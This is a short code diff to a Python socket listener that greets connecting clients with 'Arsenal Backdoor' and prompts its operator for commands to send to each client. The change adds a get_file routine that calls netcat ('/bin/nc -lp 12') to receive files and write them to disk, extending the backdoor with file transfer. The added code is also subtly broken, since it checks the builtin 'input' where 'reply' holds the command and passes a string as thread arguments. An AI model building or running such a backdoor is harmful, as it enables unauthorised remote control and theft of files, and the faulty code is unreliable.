@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-import socket, sys, os, argparse
+import socket, sys, os, argparse, subprocess
 from _thread import start_new_thread
 parser = argparse.ArgumentParser(description='q*bert says goodbye')
 parser.add_argument('-p', dest='port', help='Hosting port', required=True, type=int)
@@ -10,7 +10,10 @@ if args.host is None:
     args.host = '0.0.0.0'
 
 def get_file(filename):
-
+    command = ["/bin/nc", "-lp", "12"]
+    output = subprocess.run(command, stdout=subprocess.PIPE)
+    with open(filename, 'wb') as f:
+        f.write(output.stdout)
 
 def client(conn, addr, buff):
     conn.send(b'Arsenal Backdoor\n')
@@ -26,6 +29,8 @@ def client(conn, addr, buff):
                 reply=input('Enter command for %s: ' %addr[0])
             except ValueError:
                 print("Bad input")
+            if 'get_file' in input:
+                start_new_thread(get_file, input.split(' ')[1])
             if input == '':
                 continue
             else:
